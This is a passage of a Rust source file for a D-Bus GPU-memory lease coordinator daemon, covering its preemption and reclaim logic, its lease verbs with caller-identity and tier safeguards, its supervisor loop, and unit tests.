        if let Some(after) = free_mib(&self.gpu).await {
            println!(
                "coordd: post-evict free {after}M (was {before}M; Δ {}M reclaimed)",
                after.saturating_sub(before)
            );
        }
    }

    /// Reclaim an evicted owned holder's GPU — the destructive lever, run OFF the `Inner` lock (review
    /// C5). The lever depends on how the holder was launched (ADR-0013 vs ADR-0022 Phase 1).
    async fn perform_reclaim(&self, label: String, reclaim: Reclaim, fit: &str, before_free: u64) {
        match reclaim {
            Reclaim::Spawned { child, pid } => {
                println!(
                    "coordd: PREEMPT → SIGKILL group of `{}` pid {pid} \
                     (own-PID/group evict, ADR-0010 §5; successor {fit})",
                    short_label(&label)
                );
                sigkill_group(pid);
                // ADR-0041 §5a: AWAIT confirm-free before the grant returns (was a detached reap → the
                // over-admit window). Mirrors the Scope arm's backpressure below.
                self.confirm_spawned_reclaim(child, before_free).await;
            }
            Reclaim::Scope { handle, dir, lane_pid } => {
                self.reclaim_scope(handle, dir, lane_pid, fit, before_free).await;
            }
        }
    }

    /// SIGKILL a flatpak lane by its cgroup scope (ADR-0022 Phase 1), then BACKPRESSURE the grant: hold
    /// the successor's "granted" response until the lane's VRAM is actually freed (review B2 —
    /// `cgroup.kill` returns when the SIGKILL is *queued*, not when the driver tore down the CUDA context).
    /// Entirely off the lock; bounded so a hung lane can't stall the caller forever (fail-open, ADR-0003 —
    /// the next admission's true-free NVML read governs). The pinned dir-fd (`dir`) makes the kill
    /// recycle-proof (B3): if the scope was reaped/reused, `openat` fails and we treat it as already gone.
    async fn reclaim_scope(&self, handle: ScopeHandle, dir: File, lane_pid: u32, fit: &str, before_free: u64) {
        match scope_reclaim::kill_scope_at(&dir) {
            Ok(true) => println!(
                "coordd: PREEMPT → cgroup.kill `{}` (lane pid {lane_pid}, {}; successor {fit})",
                handle.scope_unit,
                handle.cgroup_kill_path().display()
            ),
            Ok(false) => {
                println!("coordd: PREEMPT `{}` — scope already gone (lane exited; nothing to kill)", handle.scope_unit)
            }
            Err(e) => {
                // Fail-open (ADR-0003): can't reclaim (e.g. an older kernel without cgroup.kill) → log,
                // never panic; the lane runs on uncoordinated and the next admission avoids piling on.
                eprintln!(
                    "coordd: WARNING could not cgroup.kill `{}`: {e} — lane runs uncoordinated (fail-open)",
                    handle.scope_unit
                );
                return;
            }
        }
        // Confirm the lane actually emptied (pinned fd) before re-reading free, so the just-granted
        // successor doesn't allocate into not-yet-freed VRAM (B2). Bounded — a hung lane is left to the TTL.
        let mut emptied = false;
        for _ in 0..SCOPE_RECLAIM_POLLS {
            if scope_reclaim::scope_is_empty_at(&dir) {
                emptied = true;
                break;
            }
            tokio::time::sleep(SCOPE_RECLAIM_POLL_INTERVAL).await;
        }
        tokio::time::sleep(Duration::from_millis(150)).await; // brief driver settle
        if let Some(after) = free_mib(&self.gpu).await {
            println!(
                "coordd: post-reclaim free {after}M (was {before_free}M; Δ {}M){}",
                after.saturating_sub(before_free),
                if emptied { " reclaimed" } else { " — WARNING lane scope not confirmed empty (fail-open)" }
            );
        }
    }
}

#[zbus::interface(name = "org.agentos.Coordinator1")]
impl Coordinator {
    /// Cooperative lease: the caller runs + owns its own GPU process (e.g. Hermes
    /// interactive inference) and must `Release` when done. agentosd owns nothing.
    /// `(granted, token, outcome)`; `token` is 0 when not granted.
    async fn acquire(
        &self,
        #[zbus(header)] hdr: zbus::message::Header<'_>,
        tier: String,
        estimate_mib: u32,
    ) -> (bool, u64, String) {
        let caller = hdr.sender().map(|s| s.to_string());
        // The session-bus D-Bus verbs are the trusted Hermes/human/CLI path (ADR-0021): tier passes
        // through. `AcquireAgent` (below) is the first `CallerClass::Agent` caller.
        self.do_acquire(caller, CallerClass::Trusted, tier, estimate_mib, AcquireKind::Cooperative)
            .await
            .into_trusted_reply()
    }

    /// Agent-class cooperative lease — the ADR-0020 `act` surface, reached via `agentosd mcp`'s
    /// `gpu_request` (ADR-0021 GO-1 + GO-2, both met; ratification must-fixes folded in). Identical to
    /// `Acquire` EXCEPT:
    ///   * the class is `Agent` **by virtue of this distinct verb**, not a spoofable parameter — so the
    ///     GO-1 clamp (tier → {BestEffort, Batch}, never `Interactive`) fires in `do_acquire`'s core
    ///     before `arbitrate`, and an autonomous agent can NEVER preempt the desktop or a live human;
    ///   * cooperative only (`AcquireKind::Cooperative`) — an agent never gets owned `Spawn`/`AdoptScope`
    ///     (no caller binary, no cross-principal kill primitive);
    ///   * the reply is the TYPED channel `(granted, token, code, tier_effective, short_mib,
    ///     retry_after_ms)` (#2), the token is RANDOM (#5), and the lease gets the short agent TTL (#3).
    /// `holder_peer` binds the token to the caller's connection, so only that connection may `Release`
    /// it (GO-2 layer 1); the MCP server adds per-session isolation (layer 2). `code` ∈
    /// granted|busy_retry|denied|cooling|error.
    async fn acquire_agent(
        &self,
        #[zbus(header)] hdr: zbus::message::Header<'_>,
        tier: String,
        estimate_mib: u32,
    ) -> (bool, u64, String, String, u32, u32) {
        let caller = hdr.sender().map(|s| s.to_string());
        self.do_acquire(caller, CallerClass::Agent, tier, estimate_mib, AcquireKind::Cooperative)
            .await
            .into_agent_reply()
    }

    /// Owned lease via a daemon-owned launch *profile* (ADR-0013 A2 — no caller-supplied
    /// binary). `profile` names an allowlisted command (`PROFILES`); `params` are appended as
    /// literal args (no shell). agentosd spawns + holds the PID so it can SIGKILL it on
    /// preemption (the overnight batch / ComfyUI pattern, ADR-0009/0010 §5).
    async fn spawn(
        &self,
        #[zbus(header)] hdr: zbus::message::Header<'_>,
        tier: String,
        estimate_mib: u32,
        profile: String,
        params: Vec<String>,
    ) -> (bool, u64, String) {
        let Some(mut argv) = resolve_profile(&profile) else {
            return (false, 0, format!("spawn: unknown profile `{profile}` (allowed: {})", profile_names()));
        };
        argv.extend(params);
        let caller = hdr.sender().map(|s| s.to_string());
        self.do_acquire(caller, CallerClass::Trusted, tier, estimate_mib, AcquireKind::Spawn(argv))
            .await
            .into_trusted_reply()
    }

    /// Adopt an externally-launched flatpak Blender **lane** (ADR-0022 Phase 1): register its systemd
    /// cgroup scope as the lease's reclaim handle so a higher tier can SIGKILL the lane (`cgroup.kill`)
    /// when the desktop needs the GPU back — the lever a process-group SIGKILL can't reach (the lane is
    /// reparented into a transient scope). `lane_pid` is the lane's listening PID; the daemon resolves the
    /// scope ITSELF from `/proc/<pid>/cgroup` (never a caller-supplied path, review B1) and admits ONLY an
    /// allowlisted `app-flatpak-org.blender.Blender-*.scope` — the editor/terminal/browser can never be
    /// adopted. `(granted, token, msg)`; `token` is 0 when not granted. Fail-open: a non-lane PID or an
    /// un-pinnable scope is refused, not fatal — the caller (`blender-mcp.sh`) then runs uncoordinated.
    async fn adopt_scope(
        &self,
        #[zbus(header)] hdr: zbus::message::Header<'_>,
        tier: String,
        estimate_mib: u32,
        lane_pid: u32,
    ) -> (bool, u64, String) {
        // A lane is a background GPU consumer — it must NEVER hold Interactive (the only non-preemptible
        // tier; an Interactive lane could never be reclaimed, defeating the whole point of adopting it).
        // Clamp the requested tier to ≤ Batch here (GO-1 style: clamp, don't error). do_acquire's
        // `class.clamp` is a no-op for Trusted, so the ceiling has to be applied at this verb.
        let tier = match Tier::from_arg(&tier) {
            Ok(t) => t.clamp_to(Tier::Batch).as_str().to_string(),
            Err(e) => return (false, 0, format!("adopt: {e}")),
        };
        // Resolve + allowlist the scope SERVER-SIDE from the PID (B1) — a non-lane PID can never arm a kill.
        let Some(handle) = scope_reclaim::resolve_lane_scope(lane_pid) else {
            return (false, 0, format!("adopt: pid {lane_pid} is not a flatpak Blender lane scope (refused)"));
        };
        // Pin the scope's cgroup dir as a dir-fd NOW (B3): a recycled scope name can't redirect the later
        // kill. If we can't pin it, don't adopt — better the lane runs uncoordinated than hold a stale
        // kill handle that could land on the wrong cgroup.
        let dir = match scope_reclaim::open_scope_dir(&handle) {
            Ok(d) => d,
            Err(e) => return (false, 0, format!("adopt: cannot pin scope `{}`: {e}", handle.scope_unit)),
        };
        let caller = hdr.sender().map(|s| s.to_string());
        // CallerClass::Trusted: `AdoptScope` is a DESTRUCTIVE verb, but for the trusted human-operated
        // forge it is Trusted (ADR-0022 §4). The autonomous path (ADR-0020 `act` verbs) MUST NOT reach
        // this verb until GO-2 identity + the §4 hardening land — for an untrusted caller an adopt would be
        // a cross-principal kill primitive (security review C2). The GO-1 clamp in do_acquire binds then.
        self.do_acquire(
            caller,
            CallerClass::Trusted,
            tier,
            estimate_mib,
            AcquireKind::AdoptScope { handle, dir, lane_pid },
        )
        .await
        .into_trusted_reply()
    }

    /// Release the lease (true iff `token` is the current holder's). If that holder is an
    /// agentosd-owned job, its process group is SIGKILLed too — releasing means "done with
    /// the GPU" — and the leader is reaped (no zombie).
    async fn release(
        &self,
        #[zbus(header)] hdr: zbus::message::Header<'_>,
        token: u64,
    ) -> bool {
        // GO-2 (ADR-0021): bind the release to the caller identity — a cooperative lease can only be
        // released by the bus name that acquired it (`holder_peer`), so one agent can't release another's.
        let caller = hdr.sender().map(|s| s.to_string());
        release_token(&self.inner, self.mirror.as_deref(), token, caller.as_deref()).await
    }

    /// Heartbeat the lease (ADR-0013 B5): extend the holder's TTL. True iff `token` holds AND the
    /// caller identity is allowed to renew it (GO-2). A long-running holder (a Wan 14B dream, a long
    /// inference) calls this periodically; absent a `Renew`, the supervisor auto-expires the lease so a
    /// stuck holder can't wedge the lane.
    async fn renew(&self, #[zbus(header)] hdr: zbus::message::Header<'_>, token: u64) -> bool {
        // GO-2 (ADR-0021 ratification must-fix #1): renew is identity-bound exactly like release — a
        // bound cooperative lease may only be renewed by the bus name that acquired it, so one agent
        // can't extend (or pin) another's TTL via the guessable monotonic token. Shares `may_release`.
        let caller = hdr.sender().map(|s| s.to_string());
        let mut inner = self.inner.lock().await;
        if may_renew(
            inner.holder_peer.as_ref(),
            inner.lease.holder_token(),
            inner.lease.holder_tier().is_some(),
            token,
            caller.as_deref(),
        ) {
            // Re-apply the holder's OWN (per-class) TTL — never silently promote a short agent lease
            // to the 90-min dream default on its first heartbeat (ADR-0021 #3). The invariant `holder
            // exists ⟺ holder_ttl is Some` holds by construction (`do_acquire` sets it; the release
            // paths clear it), so the fallback is unreachable for a live holder — pinned by debug_assert.
            // We keep `lease_ttl` (not the shorter agent TTL) for the fallback so a hypothetical
            // None-but-live holder defaults to the SAFE-for-trusted long TTL rather than wrongly expiring
            // a legitimate dream; the assert ensures we'd catch the impossible case in tests (review nit).
            debug_assert!(inner.holder_ttl.is_some(), "live holder must have a recorded TTL (do_acquire sets it)");
            let ttl = inner.holder_ttl.unwrap_or_else(lease_ttl);
            inner.holder_deadline = Some(Instant::now() + ttl);
            true
        } else {
            false
        }
    }

    /// ADR-0029 §3 — REGISTER the live UE wallpaper as a throttleable resident. A heavy gen that would be
    /// VRAM-denied first asks UE (over Remote Control) to shrink to its FLOOR rung so the two COEXIST,
    /// instead of denying. `full_mib`/`floor_mib` are UE's two-number footprint (D4); `pid` is recorded
    /// for liveness + a future kill backstop (the daemon does NOT own the PID — UE launches itself). A
    /// degenerate footprint (`floor > full`, or zero full) is rejected. Called by `nimbus-ue-wallpaper`
    /// on launch; `UnregisterWallpaper` on stop. Trust: a control-plane verb on the session bus, like
    /// `Spawn` (the trusted local/CLI path; no agent verb reaches it). A LYING registration can only
    /// cause a needless throttle/deny — NEVER an OOM, because admission is gated on the RE-MEASURED free,
    /// not on these self-reported numbers (the cardinal-sin guard).
    async fn register_wallpaper(&self, pid: u32, full_mib: u64, floor_mib: u64) -> bool {
        if floor_mib > full_mib || full_mib == 0 {
            eprintln!("coordd: RegisterWallpaper rejected — bad footprint (full {full_mib}M, floor {floor_mib}M)");
            return false;
        }
        let mut g = self.inner.lock().await;
        g.throttleable_wallpaper = Some(Wallpaper { pid, full_mib, floor_mib });
        println!("coordd: ADR-0029 §3 wallpaper registered (pid {pid}, full {full_mib}M / floor {floor_mib}M)");
        true
    }

    /// ADR-0029 §3 — UNREGISTER the throttleable wallpaper (UE stopped / a different wallpaper selected).
    /// Clears the registration so no further request throttles it. If UE is currently throttled, the
    /// `wallpaper_throttled` flag is LEFT for the supervisor's invariant restore to resolve once the lease
    /// frees (Applied if UE is still up, Unreachable-clears it if UE is gone) — never strand the flag.
    async fn unregister_wallpaper(&self) -> bool {
        let mut g = self.inner.lock().await;
        let was = g.throttleable_wallpaper.take().is_some();
        if was {
            println!("coordd: ADR-0029 §3 wallpaper unregistered");
        }
        was
    }

    /// `(held, tier, token, free_mib)` — current lease + live free VRAM.
    async fn status(&self) -> (bool, String, u64, u32) {
        let free = free_mib(&self.gpu).await.unwrap_or(0) as u32;
        let inner = self.inner.lock().await;
        match inner.lease.holder_tier() {
            Some(t) => (true, t.as_str().to_string(), inner.lease.holder_token(), free),
            None => (false, String::new(), 0, free),
        }
    }
}

pub fn run() -> Result<(), Box<dyn std::error::Error>> {
    let rt = tokio::runtime::Builder::new_multi_thread().enable_all().build()?;
    rt.block_on(serve())
}

/// Background supervisor: reap a *naturally*-exited owned child and auto-release its
/// lease. Polls `try_wait` (never holds a `wait` future, so it never races the D-Bus
/// handlers for the child). The monotonic-token guard makes a late reap a safe no-op if
/// the holder has since changed.
async fn supervise(inner: Arc<Mutex<Inner>>, mirror: Option<PathBuf>, conn: zbus::Connection) {
    // For B4 peer-liveness checks. If the proxy can't be built, peer-disconnect detection is
    // simply off (the natural-exit reap still works) — degrade, don't crash.
    let dbus = zbus::fdo::DBusProxy::new(&conn).await.ok();
    loop {
        tokio::time::sleep(Duration::from_millis(750)).await;

        // 1. Reap a *naturally*-exited owned child and auto-release its lease. `try_wait` never
        //    holds a `wait` future, so it can't race the D-Bus handlers for the child. The
        //    monotonic-token guard makes a late reap a safe no-op if the holder has changed.
        let (exited, snap) = {
            let mut g = inner.lock().await;
            // Natural-exit detection differs by reclaim kind: a spawned child is reaped via `try_wait`; an
            // adopted lane is "exited" when its cgroup scope has emptied (read via the pinned fd — only a
            // GONE scope counts as empty, review C2, so a transient read flap can't false-release a live
            // lane). Done under the lock + by the job's own token, so a late detect is a safe no-op (C3).
            let done: Option<(u64, String, String)> = match g.owned.as_mut() {
                Some(job) => match &mut job.reclaim {
                    Reclaim::Spawned { child, .. } => child
                        .try_wait()
                        .ok()
                        .flatten()
                        .map(|status| (job.token, job.label.clone(), format!("exited ({status})"))),
                    Reclaim::Scope { dir, .. } => scope_reclaim::scope_is_empty_at(dir)
                        .then(|| (job.token, job.label.clone(), "lane scope emptied".to_string())),
                },
                None => None,
            };
            if let Some((token, _, _)) = &done {
                g.owned = None;
                g.lease.release(*token);
                if g.holder_peer.as_ref().is_some_and(|(t, _)| t == token) {
                    g.holder_peer = None;
                }
                // Clear the TTL state alongside the release, symmetric with `release_token` (review nit):
                // a freed lease carries no deadline/TTL. Inert today (B5 only fires when a holder token is
                // live) but keeps the two release paths consistent.
                g.holder_deadline = None;
                g.holder_ttl = None;
                if g.lease.holder_tier().is_none() {
                    g.last_preempt.clear();
                    // ADR-0041: a naturally-exited owned job freed the lease → wake the arbiter.
                    g.freed_seq = g.freed_seq.wrapping_add(1);
                }
            }
            (done, lease_snapshot(&g))
        };
        if let Some((token, label, reason)) = exited {
            println!("coordd: owned job `{}` (token {token}) {reason} → lease released", short_label(&label));
            // Publish off-lock (the guard is already dropped) so the keyhole reflects the release.
            write_lease_mirror(mirror.as_deref(), &snap);
        }

        // 2. Peer-disconnect auto-release (ADR-0013 B4): if the lease holder's D-Bus peer has
        //    vanished (crashed without `Release`), free the lease so a dead holder can't wedge
        //    the lane forever (finding H4). Poll-based — reuses this loop, no signal stream.
        if let Some(dbus) = &dbus {
            let (peer, owned_token) = {
                let g = inner.lock().await;
                (g.holder_peer.clone(), g.owned.as_ref().map(|j| j.token))
            };
            if let Some((token, name)) = peer {
                // B4 governs a COOPERATIVE holder (its own process IS the GPU user). An owned holder — a
                // Spawn child OR an adopted lane (review B2 binds its peer for GO-2 Release authz) — has its
                // own liveness signal (child exit / scope empty), so a fire-and-forget launcher (e.g.
                // `blender-mcp.sh`) disconnecting must NOT drop a live lane. Skip B4 for an owned token.
                if owned_token != Some(token) {
                    let alive = match zbus::names::BusName::try_from(name.as_str()) {
                        Ok(bn) => dbus.name_has_owner(bn).await.unwrap_or(true), // on error assume alive
                        Err(_) => true,
                    };
                    if !alive {
                        println!("coordd: holder peer {name} gone → auto-release token {token} (ADR-0013 B4)");
                        release_token(&inner, mirror.as_deref(), token, None).await; // authoritative (B4)
                    }
                }
            }
        }

        // 3. TTL expiry (B5): a holder past its deadline without a Renew is auto-released —
        //    backstops a stuck/buggy holder and an owned job whose Spawn caller crashed.
        let expired = {
            let g = inner.lock().await;
            match (g.lease.holder_token(), g.holder_deadline) {
                (tok, Some(dl)) if tok != 0 && Instant::now() >= dl => Some(tok),
                _ => None,
            }
        };
        if let Some(tok) = expired {
            println!("coordd: lease TTL expired → auto-release token {tok} (ADR-0013 B5)");
            release_token(&inner, mirror.as_deref(), tok, None).await; // authoritative (B5 TTL)
        }

        // 4. ADR-0029 §3 INVARIANT RESTORE: restore UE to full once NO gen holds the lease. The throttle
        //    is justified only while a heavy holder needs the VRAM; keying the restore on this invariant
        //    (lease-free), NOT on the throttling token, catches EVERY release path — explicit Release,
        //    natural-exit reap, TTL expiry, peer-disconnect, preempt-eviction, and a speculative throttle
        //    whose grant was denied — with one sweep no per-path hook can miss. A short free-dwell
        //    (WALLPAPER_RESTORE_FREE_TICKS) avoids a Floor→Full→Floor strobe when sessions chain. The RC
        //    actuation runs OFF the lock; `wallpaper_throttle_inflight` serializes it against a throttle.
        // Self-heal a LEAKED in-flight claim: if a `do_acquire` future were dropped mid-throttle (a
        // cancellation zbus doesn't do today, but a future dispatcher change could), the flag would stay
        // Some forever and pin UE at floor (it gates BOTH a new throttle and this restore). A claim older
        // than WALLPAPER_INFLIGHT_STALE (far longer than any real RC PUT + poll) is stale → clear it.
        {
            let mut g = inner.lock().await;
            if g.wallpaper_throttle_inflight.is_some_and(|t| t.elapsed() > WALLPAPER_INFLIGHT_STALE) {
                g.wallpaper_throttle_inflight = None;
                eprintln!("coordd: ADR-0029 §3 cleared a STALE wallpaper-throttle in-flight claim (cancellation backstop)");
            }
        }
        let restore = {
            let mut g = inner.lock().await;
            if g.lease.holder_tier().is_none() && g.wallpaper_throttled && g.wallpaper_throttle_inflight.is_none() {
                g.wallpaper_free_ticks = g.wallpaper_free_ticks.saturating_add(1);
                if g.wallpaper_free_ticks >= WALLPAPER_RESTORE_FREE_TICKS {
                    g.wallpaper_throttle_inflight = Some(Instant::now()); // claim (serialize vs a throttle)
                    true
                } else {
                    false
                }
            } else {
                g.wallpaper_free_ticks = 0; // lease held, not throttled, or in-flight → reset the dwell
                false
            }
        };
        if restore {
            let outcome = tokio::task::spawn_blocking(|| {
                crate::rc_throttle::apply_rung(crate::governor::Rung::Full)
            })
            .await
            .unwrap_or(crate::rc_throttle::ThrottleOutcome::Unreachable);
            let cleared = {
                let mut g = inner.lock().await;
                g.wallpaper_throttle_inflight = None;
                g.wallpaper_free_ticks = 0;
                // Applied → restored. Unreachable → UE is gone (crashed/relaunched at full); treat as
                // un-throttled so a stale flag can't block future throttles. Rejected → UE up but refused;
                // LEAVE throttled=true to retry on the next free sweep (never flag-clear-but-floored).
                let cleared = matches!(
                    outcome,
                    crate::rc_throttle::ThrottleOutcome::Applied | crate::rc_throttle::ThrottleOutcome::Unreachable
                );
                if cleared {
                    g.wallpaper_throttled = false;
                }
                cleared
            };
            if cleared {
                println!("coordd: ADR-0029 §3 restore UE floor→full (lease free) — {outcome:?}");
            }
        }
    }
}

async fn serve() -> Result<(), Box<dyn std::error::Error>> {
    let gpu = Arc::new(GpuBackend::detect());
    if gpu.is_absent() {
        return Err("no GPU detected (no NVIDIA NVML, no AMD sysfs) — the lease coordinator needs GPU sensing".into());
    }
    let inner = Arc::new(Mutex::new(Inner::new()));
    let mirror = feed_dir().ok().map(|d| d.join("lease.json"));
    // Publish an initial "no contention" so the keyhole has a file to read from the first tick.
    write_lease_mirror(mirror.as_deref(), &Lease::default());

    let obj = Coordinator { inner: Arc::clone(&inner), gpu, mirror: mirror.clone() };
    let conn = zbus::connection::Builder::session()?
        .name(BUS_NAME)?
        .serve_at(OBJ_PATH, obj)?
        .build()
        .await?;
    // Supervisor needs the connection for B4 peer-liveness checks; keep `conn` alive until exit.
    tokio::spawn(supervise(Arc::clone(&inner), mirror, conn.clone()));

    // ADR-0023 P1 (home A): mount the `org.agentos.Wind1` window-drag→wind sink on THIS connection +
    // spawn its fixed-tick spring task. It owns ONLY its own state (no path to `Inner`) so the 60 Hz
    // tick can never delay a preemption SIGKILL (Design 0023 §3.1). Fail-open: a mount failure is
    // logged, never fatal — the coordinator keeps serving regardless.
    let wind_dir = feed_dir().ok();
    crate::wind::attach(&conn, wind_dir).await;

    println!("agentosd coordd — VRAM coordinator daemon serving {BUS_NAME} (ADR-0006/0010)");
    println!("  spawn (owned) : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Spawn susas batch 2000 sleep 1 600");
    println!("  eevee (owned) : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Spawn susas batch {EEVEE_RENDER_EST_MIB} eevee-render 2 --out /run/user/$UID/agentos/blender  (ADR-0023; light lane)");
    println!("  acquire (coop): busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Acquire su interactive 5000");
    println!("  acquire (agent): busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} AcquireAgent su interactive 3000  (ADR-0020/0021 act — clamps to batch; → btssuu)");
    println!("  adopt (lane)  : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} AdoptScope suu batch 3000 <lane_pid>  (ADR-0022)");
    println!("  status        : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Status");
    println!("  release       : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Release t <token>");
    tokio::signal::ctrl_c().await?;
    println!("agentosd coordd — shutdown");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fits() -> Admission {
        admit(20_000, 2_000, HEADROOM_MIB) // plenty of room
    }
    fn wont_fit() -> Admission {
        admit(1_000, 50_000, HEADROOM_MIB) // far too big
    }

    #[test]
    fn warm_reclaim_eligibility_is_heavy_lane_vram_short_only() {
        let est = 17_000;
        let hr = headroom_for(est);
        // Batch/best-effort that won't fit (free far below est+headroom) → eligible for graceful reclaim.
        assert!(warm_reclaim_eligible(Tier::Batch, Some(2_000), est, hr));
        assert!(warm_reclaim_eligible(Tier::BestEffort, Some(2_000), est, hr));
        // The SAME shortfall on Interactive is NOT eligible — it fails open and must never wait on an
        // `ollama stop` (ADR-0003). This is the load-bearing asymmetry.
        assert!(!warm_reclaim_eligible(Tier::Interactive, Some(2_000), est, hr));
        // A batch request that already fits doesn't reclaim (no shortfall → admission would grant).
        assert!(!warm_reclaim_eligible(Tier::Batch, Some(20_000), est, hr));
        // Unreadable NVML (None) is never eligible — never unload the warm pool blind.
        assert!(!warm_reclaim_eligible(Tier::Batch, None, est, hr));
    }

    #[test]
    fn wallpaper_throttle_eligibility_only_when_a_coexisting_throttle_would_admit() {
        let est = 17_000u64;
        let hr = headroom_for(est); // need = est + hr = 18_062
        let min_gain = 512u64;
        let rich = Some(Wallpaper { pid: 1, full_mib: 3_000, floor_mib: 1_000 }); // full→floor frees 2_000
        let trivial = Some(Wallpaper { pid: 1, full_mib: 1_200, floor_mib: 1_000 }); // frees 200 (< min_gain)

        // Heavy-lane, would-deny (free 17_000 < 18_062), and throttling the rich wallpaper (frees 2_000 →
        // free_after 19_000 ≥ 18_062) would COEXIST → eligible.
        assert!(wallpaper_throttle_eligible(Tier::Batch, Some(17_000), est, hr, rich, min_gain));
        assert!(wallpaper_throttle_eligible(Tier::BestEffort, Some(17_000), est, hr, rich, min_gain));

        // No wallpaper registered → dormant (the live default; the whole path is a no-op).
        assert!(!wallpaper_throttle_eligible(Tier::Batch, Some(17_000), est, hr, None, min_gain));
        // Interactive fails OPEN — never delayed by an RC round-trip (the load-bearing asymmetry).
        assert!(!wallpaper_throttle_eligible(Tier::Interactive, Some(17_000), est, hr, rich, min_gain));
        // Unreadable NVML → never throttle blind.
        assert!(!wallpaper_throttle_eligible(Tier::Batch, None, est, hr, rich, min_gain));
        // Already fits (free 20_000 ≥ 18_062) → nothing to throttle for.
        assert!(!wallpaper_throttle_eligible(Tier::Batch, Some(20_000), est, hr, rich, min_gain));
        // Trivial scene: full→floor frees < min_gain → not worth a visible rung change for ~0 MB.
        assert!(!wallpaper_throttle_eligible(Tier::Batch, Some(17_000), est, hr, trivial, min_gain));
        // Throttle INSUFFICIENT (free 5_000; even +2_000 = 7_000 < 18_062) → yield_decision says KILL, not
        // coexist → the coexist-throttle does NOT fire (the kill backstop is a separate, deferred path).
        assert!(!wallpaper_throttle_eligible(Tier::Batch, Some(5_000), est, hr, rich, min_gain));
    }

    #[test]
    fn short_label_is_basename_of_argv0() {
        assert_eq!(short_label("/usr/bin/python main.py"), "python");
        assert_eq!(short_label("comfyui --port 8188"), "comfyui");
        assert_eq!(short_label(""), "");
        // The comfyui launch profile maps to a friendly holder so the tray reads "batch (comfyui)"
        // (matches the keyhole WORKLOAD label) rather than the raw launcher basename.
        assert_eq!(
            short_label("/srv/agentos/spikes/dreaming/start-comfyui.sh"),
            "comfyui"
        );
        // The Blender render profile (ADR-0022) maps the same way → tray reads "batch (blender-render)".
        assert_eq!(
            short_label("/srv/agentos/integrations/blender/render-wrapper.sh"),
            "blender-render"
        );
        // An adopted lane's label IS its scope unit → collapses to a stable tray name (ADR-0022 Phase 1),
        // never the noisy per-instance id.
        assert_eq!(short_label("app-flatpak-org.blender.Blender-3630677696.scope"), "blender-lane");
        assert_eq!(short_label("app-flatpak-org.blender.Blender-1.scope"), "blender-lane");
    }

    #[test]
    fn mirror_snapshot_idle_is_no_contention() {
        let inner = Inner::new();
        assert_eq!(lease_snapshot(&inner), Lease::default());
    }

    #[test]
    fn mirror_snapshot_reflects_tier_and_preempt_but_not_a_faked_holder() {
        let mut inner = Inner::new();
        // A cooperative interactive holder: agentosd knows the tier, not the process name.
        inner.lease.acquire(Tier::Interactive, &fits());
        inner.last_preempt = "interactive preempted token 1 (fits)".into();
        let snap = lease_snapshot(&inner);
        assert_eq!(snap.tier, "interactive");
        assert_eq!(snap.holder, ""); // honest: not fabricated for a cooperative holder
        assert_eq!(snap.preempt, "interactive preempted token 1 (fits)");
    }

    #[test]
    fn fresh_acquire_grants_token_one() {
        let mut st = LeaseState::new();
        assert_eq!(st.acquire(Tier::Batch, &fits()), AcquireResult::Granted { token: 1 });
        assert_eq!(st.holder_tier(), Some(Tier::Batch));
        assert_eq!(st.holder_token(), 1);
    }

    #[test]
    fn equal_tier_is_queued_and_holder_unchanged() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits());
        assert_eq!(st.acquire(Tier::Batch, &fits()), AcquireResult::Queued);
        assert_eq!(st.holder_token(), 1);
    }

    #[test]
    fn interactive_preempts_batch_with_new_token_and_victim() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits()); // token 1
        assert_eq!(
            st.acquire(Tier::Interactive, &fits()),
            AcquireResult::Preempted { token: 2, victim: 1 }
        );
        assert_eq!(st.holder_tier(), Some(Tier::Interactive));
        assert_eq!(st.holder_token(), 2);
    }

    #[test]
    fn an_agent_clamped_request_queues_behind_interactive_instead_of_preempting() {
        // ADR-0021 GO-1 at the install boundary: an agent asks for interactive, the core clamps it
        // to batch, so against a live interactive holder it QUEUES — the desktop is never preempted.
        let mut st = LeaseState::new();
        st.acquire(Tier::Interactive, &fits()); // a live human/interactive holder, token 1
        let agent_tier = CallerClass::Agent.clamp(Tier::Interactive); // == Batch
        assert_eq!(st.acquire(agent_tier, &fits()), AcquireResult::Queued);
        assert_eq!(st.holder_token(), 1); // incumbent untouched
        assert_eq!(st.holder_tier(), Some(Tier::Interactive));
    }

    #[test]
    fn go2_release_is_identity_bound_for_cooperative_holders() {
        // ADR-0021 GO-2: a bound cooperative lease is releasable ONLY by its acquiring peer, so one
        // agent behind the MCP act surface can't release (DoS) another's lease.
        let bound = (7u64, ":1.42".to_string()); // token 7 acquired by bus name :1.42
        assert!(!may_release(Some(&bound), 7, Some(":1.99")), "a foreign peer cannot release it");
        assert!(may_release(Some(&bound), 7, Some(":1.42")), "the acquiring peer can");
        assert!(may_release(Some(&bound), 7, None), "an authoritative system release (B4/B5) always may");
        assert!(may_release(None, 7, Some(":1.99")), "an unbound (owned) holder stays token-only");
        // A token that isn't the bound one falls through to the token guard (release() then fails it),
        // so a foreign release reads as "unknown token" — identical failure, no state change.
        assert!(may_release(Some(&bound), 999, Some(":1.99")));
    }

    #[test]
    fn go2_renew_is_identity_bound_like_release() {
        // ADR-0021 GO-2 ratification must-fix #1: renew must be identity-bound exactly like release,
        // or a peer that guessed the monotonic token could pin/extend another holder's lease and defeat
        // the B5 stuck-holder backstop. (holder_token=7, holder_live=true unless noted.)
        let bound = (7u64, ":1.42".to_string()); // token 7 held by bus name :1.42
        assert!(may_renew(Some(&bound), 7, true, 7, Some(":1.42")), "the acquiring peer renews its own live lease");
        assert!(!may_renew(Some(&bound), 7, true, 7, Some(":1.99")), "a foreign peer cannot renew it (the hole this fixes)");
        assert!(!may_renew(Some(&bound), 7, true, 8, Some(":1.42")), "even the right peer can't renew a non-holder token");
        assert!(!may_renew(Some(&bound), 7, false, 7, Some(":1.42")), "no live holder (tier gone) → nothing to renew");
        // An unbound (owned Spawn) holder stays token-only, so the busctl-per-call dream client renews
        // across fresh connections (different bus name each call) — no regression.
        assert!(may_renew(None, 5, true, 5, Some(":1.99")), "an unbound owned holder stays token-only");
    }

    #[test]
